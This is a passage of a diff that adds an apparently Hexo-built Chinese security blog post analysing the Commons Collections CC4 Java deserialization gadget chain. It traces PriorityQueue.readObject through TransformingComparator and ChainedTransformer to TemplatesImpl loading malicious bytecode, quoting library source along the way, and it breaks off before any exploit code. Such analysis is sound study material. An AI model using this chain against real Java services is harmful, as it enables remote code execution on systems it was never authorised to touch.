@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zifeiyu-sec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="CC4链是借助Apache Commons Collections组件中PriorityQueue的反序列化触发机制，结合TransformingComparator与ChainedTransformer，通过反射调用实现恶意命令执行的Java反序列化利用链，其核心在于利用队列排序触发Transformer链的执行逻辑。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全之CC4链分析">
+<meta property="og:url" content="http://zifeiyu-sec.github.io/2025/10/12/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BCC4%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="子非鱼的博客">
+<meta property="og:description" content="CC4链是借助Apache Commons Collections组件中PriorityQueue的反序列化触发机制，结合TransformingComparator与ChainedTransformer，通过反射调用实现恶意命令执行的Java反序列化利用链，其核心在于利用队列排序触发Transformer链的执行逻辑。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-10-12T09:09:46.000Z">
+<meta property="article:modified_time" content="2025-10-31T09:32:48.480Z">
+<meta property="article:author" content="子非鱼">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://zifeiyu-sec.github.io/2025/10/12/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BCC4%E9%93%BE%E5%88%86%E6%9E%90/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://zifeiyu-sec.github.io/2025/10/12/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BCC4%E9%93%BE%E5%88%86%E6%9E%90/","path":"2025/10/12/Java攻防/Java安全之CC4链分析/","title":"Java安全之CC4链分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java安全之CC4链分析 | 子非鱼的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"cdn":"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.7.0/mermaid.min.js","integrity":"sha256-4+IKDqhZ/sXjc8Wtl2/MsxI4e0s1KpEVdbEP7V/Lz8U="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">子非鱼的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在时间的尺度上，一切问题都有答案</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">CC4链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E6%89%A7%E8%A1%8C%E8%B7%AF%E5%BE%84"><span class="nav-number">1.1.</span> <span class="nav-text">完整执行路径</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC4-%E9%93%BE%E5%AE%8C%E6%95%B4%E8%BF%BD%E8%B8%AA%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">CC4 链完整追踪分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%85%A5%E5%8F%A3%E7%82%B9%EF%BC%9APriorityQueue-%E7%9A%84-readObject-%E6%96%B9%E6%B3%95"><span class="nav-number">1.2.1.</span> <span class="nav-text">一、入口点：PriorityQueue 的 readObject 方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%A0%86%E7%BB%93%E6%9E%84%E9%87%8D%E5%BB%BA%EF%BC%9A%E4%BB%8E-heapify-%E5%88%B0-siftDownUsingComparator"><span class="nav-number">1.2.2.</span> <span class="nav-text">二、堆结构重建：从 heapify 到 siftDownUsingComparator</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-heapify-%EF%BC%9A%E5%A0%86%E5%88%9D%E5%A7%8B%E5%8C%96%E6%96%B9%E6%B3%95"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">1. heapify ()：堆初始化方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-siftDown-%EF%BC%9A%E5%A0%86%E8%B0%83%E6%95%B4%E7%9A%84%E5%88%86%E6%94%AF%E9%80%89%E6%8B%A9"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">2. siftDown ()：堆调整的分支选择</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-siftDownUsingComparator-%EF%BC%9A%E8%A7%A6%E5%8F%91%E6%AF%94%E8%BE%83%E5%99%A8%E8%B0%83%E7%94%A8"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">3. siftDownUsingComparator ()：触发比较器调用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%AF%94%E8%BE%83%E5%99%A8%E8%B0%83%E7%94%A8%EF%BC%9ATransformingComparator-%E7%9A%84-compare-%E6%96%B9%E6%B3%95"><span class="nav-number">1.2.3.</span> <span class="nav-text">三、比较器调用：TransformingComparator 的 compare 方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E8%BD%AC%E6%8D%A2%E9%93%BE%E6%89%A7%E8%A1%8C%EF%BC%9AChainedTransformer-%E7%9A%84-transform-%E6%96%B9%E6%B3%95"><span class="nav-number">1.2.4.</span> <span class="nav-text">四、转换链执行：ChainedTransformer 的 transform 方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E8%BD%AC%E6%8D%A2%E5%99%A8%E9%93%BE%EF%BC%9A%E4%BB%8E-ConstantTransformer-%E5%88%B0-InstantiateTransformer"><span class="nav-number">1.2.5.</span> <span class="nav-text">五、转换器链：从 ConstantTransformer 到 InstantiateTransformer</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-ConstantTransformer%EF%BC%9A%E8%BF%94%E5%9B%9E%E9%A2%84%E8%AE%BE%E7%9A%84%E6%81%B6%E6%84%8F%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">1. ConstantTransformer：返回预设的恶意对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-InstantiateTransformer%EF%BC%9A%E5%AE%9E%E4%BE%8B%E5%8C%96-TrAXFilter"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">2. InstantiateTransformer：实例化 TrAXFilter</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E8%A7%A6%E5%8F%91%EF%BC%9A%E4%BB%8E-TrAXFilter-%E5%88%B0-TemplatesImpl"><span class="nav-number">1.2.6.</span> <span class="nav-text">六、代码执行触发：从 TrAXFilter 到 TemplatesImpl</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-TrAXFilter-%E7%9A%84%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%EF%BC%9A%E8%A7%A6%E5%8F%91-TemplatesImpl-%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">1.2.6.1.</span> <span class="nav-text">1. TrAXFilter 的构造函数：触发 TemplatesImpl 的方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-TemplatesImpl-%E7%9A%84-newTransformer-%EF%BC%9A%E5%90%AF%E5%8A%A8%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B"><span class="nav-number">1.2.6.2.</span> <span class="nav-text">2. TemplatesImpl 的 newTransformer ()：启动类加载流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-getTransletInstance-%EF%BC%9A%E6%A3%80%E6%9F%A5%E5%B9%B6%E5%8A%A0%E8%BD%BD%E7%B1%BB"><span class="nav-number">1.2.6.3.</span> <span class="nav-text">3. getTransletInstance ()：检查并加载类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-defineTransletClasses-%EF%BC%9A%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-number">1.2.6.4.</span> <span class="nav-text">4. defineTransletClasses ()：使用自定义类加载器加载字节码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-TransletClassLoader-%E7%9A%84-defineClass%EF%BC%9A%E5%AE%8C%E6%88%90%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A0%E8%BD%BD"><span class="nav-number">1.2.6.5.</span> <span class="nav-text">5. TransletClassLoader 的 defineClass：完成字节码加载</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E5%AE%8C%E6%95%B4%E8%B0%83%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93"><span class="nav-number">1.2.7.</span> <span class="nav-text">七、完整调用链总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E5%85%B3%E9%94%AE%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.2.8.</span> <span class="nav-text">八、关键触发条件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81"><span class="nav-number">1.3.</span> <span class="nav-text">代码</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="子非鱼"
+      src="/images/1.png">
+  <p class="site-author-name" itemprop="name">子非鱼</p>
+  <div class="site-description" itemprop="description">学习过程的记录</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">40</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zifeiyu-sec" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/zifeiyu-sec" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>Gitee</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://example.com/" title="https:&#x2F;&#x2F;example.com" rel="noopener" target="_blank">Title</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zifeiyu-sec.github.io/2025/10/12/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BCC4%E9%93%BE%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.png">
+      <meta itemprop="name" content="子非鱼">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="子非鱼的博客">
+      <meta itemprop="description" content="学习过程的记录">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java安全之CC4链分析 | 子非鱼的博客">
+      <meta itemprop="description" content="CC4链是借助Apache Commons Collections组件中PriorityQueue的反序列化触发机制，结合TransformingComparator与ChainedTransformer，通过反射调用实现恶意命令执行的Java反序列化利用链，其核心在于利用队列排序触发Transformer链的执行逻辑。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java安全之CC4链分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-10-12 17:09:46" itemprop="dateCreated datePublished" datetime="2025-10-12T17:09:46+08:00">2025-10-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-10-31 17:32:48" itemprop="dateModified" datetime="2025-10-31T17:32:48+08:00">2025-10-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">Java攻防</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">CC4链是借助Apache Commons Collections组件中PriorityQueue的反序列化触发机制，结合TransformingComparator与ChainedTransformer，通过反射调用实现恶意命令执行的Java反序列化利用链，其核心在于利用队列排序触发Transformer链的执行逻辑。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1>CC4链</h1>
+<h2 id="完整执行路径"><strong>完整执行路径</strong></h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">└── PriorityQueue.readObject()</span><br><span class="line">    ├── 恢复comparator（TransformingComparator）和队列元素</span><br><span class="line">    └── PriorityQueue.heapify()</span><br><span class="line">        └── PriorityQueue.siftDown()</span><br><span class="line">            └── PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                └── TransformingComparator.compare()</span><br><span class="line">                    ├── ChainedTransformer.transform()</span><br><span class="line">                    │   ├── ConstantTransformer.transform() → 返回TemplatesImpl</span><br><span class="line">                    │   └── InstantiateTransformer.transform()</span><br><span class="line">                    │       └── TrAXFilter.&lt;init&gt;(TemplatesImpl)</span><br><span class="line">                    │           └── TemplatesImpl.newTransformer()</span><br><span class="line">                    │               └── TemplatesImpl.getTransletInstance()</span><br><span class="line">                    │                   └── TemplatesImpl.defineTransletClasses()</span><br><span class="line">                    │                       └── TransletClassLoader.defineClass()</span><br><span class="line">                    │                           └── 加载恶意字节码 → 执行静态代码块</span><br><span class="line">                    └── （第二次转换：处理第二个元素，流程相同）</span><br></pre></td></tr></table></figure>
+<h2 id="CC4-链完整追踪分析">CC4 链完整追踪分析</h2>
+<h3 id="一、入口点：PriorityQueue-的-readObject-方法">一、入口点：PriorityQueue 的 readObject 方法</h3>
+<p>PriorityQueue的反序列化过程是整个链条的起点，其readObject方法负责恢复队列状态并重建堆结构，这是触发后续调用链的关键：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 读取非静态非瞬态字段（包括comparator和queue数组）</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 读取元素数量并初始化队列数组</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        queue[i] = s.readObject(); <span class="comment">// 反序列化队列元素</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重建堆结构（核心触发点）</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>关键细节</strong>：</p>
+<ul>
+<li>
+<p>defaultReadObject()会恢复我们预先设置的comparator（TransformingComparator实例）</p>
+</li>
+<li>
+<p>队列元素至少需要 2 个（如&quot;a&quot;和&quot;b&quot;），确保heapify()能执行有效的堆调整</p>
+</li>
+<li>
+<p>反序列化时不会保留堆的结构信息，必须通过heapify()重建，这是整个链条的 “启动器”</p>
+</li>
+</ul>
+<h3 id="二、堆结构重建：从-heapify-到-siftDownUsingComparator">二、堆结构重建：从 heapify 到 siftDownUsingComparator</h3>
+<h4 id="1-heapify-：堆初始化方法">1. heapify ()：堆初始化方法</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 从最后一个非叶子节点开始向前遍历</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        siftDown(i, (E) queue[i]); <span class="comment">// 对每个节点执行下移操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>当队列元素数量size &gt;= 2时，循环至少执行 1 次，确保siftDown被调用</p>
+</li>
+<li>
+<p>i的初始值为(size/2 - 1)，这是最后一个非叶子节点的索引（叶子节点无需下移）</p>
+</li>
+</ul>
+<h4 id="2-siftDown-：堆调整的分支选择">2. siftDown ()：堆调整的分支选择</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">        siftDownUsingComparator(k, x); <span class="comment">// 使用自定义比较器</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        siftDownComparable(k, x); <span class="comment">// 使用自然排序（不触发链条）</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>由于我们构造PriorityQueue时传入了TransformingComparator，comparator不为 null</p>
+</li>
+<li>
+<p>执行路径必然进入siftDownUsingComparator，这是链条的第一个关键分支</p>
+</li>
+</ul>
+<h4 id="3-siftDownUsingComparator-：触发比较器调用">3. siftDownUsingComparator ()：触发比较器调用</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123; <span class="comment">// 当k是叶子节点时停止循环</span></span><br><span class="line">        <span class="comment">// 计算左右子节点索引</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 关键调用1：比较左右子节点，选择优先级更高的节点</span></span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp; comparator.compare((E) queue[right], (E) c) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 关键调用2：比较当前节点与子节点</span></span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 下移节点</span></span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>核心触发逻辑</strong>：</p>
+<ul>
+<li>
+<p>方法中存在两次comparator.compare()调用，均会触发TransformingComparator的比较逻辑</p>
+</li>
+<li>
+<p>第一次比较左右子节点（queue[right]和queue[child]）</p>
+</li>
+<li>
+<p>第二次比较当前节点（x）与选中的子节点（c）</p>
+</li>
+<li>
+<p>这两次调用都会完整执行后续的转换链，是触发恶意代码的直接原因</p>
+</li>
+</ul>
+<h3 id="三、比较器调用：TransformingComparator-的-compare-方法">三、比较器调用：TransformingComparator 的 compare 方法</h3>
+<p>TransformingComparator是连接堆调整与转换链的桥梁，其compare方法会先转换对象再比较：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparator</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;T&gt;, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Comparator&lt;? <span class="built_in">super</span> T&gt; decorated; <span class="comment">// 基础比较器</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> T, ? <span class="keyword">extends</span> <span class="title class_">T</span>&gt; transformer; <span class="comment">// 转换链</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(T o1, T o2)</span> &#123;</span><br><span class="line">        <span class="comment">// 对两个输入对象执行转换（核心操作）</span></span><br><span class="line">        <span class="type">T</span> <span class="variable">value1</span> <span class="operator">=</span> transformer.transform(o1);</span><br><span class="line">        <span class="type">T</span> <span class="variable">value2</span> <span class="operator">=</span> transformer.transform(o2);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 使用基础比较器比较转换后的值（次要操作）</span></span><br><span class="line">        <span class="keyword">return</span> decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br><span 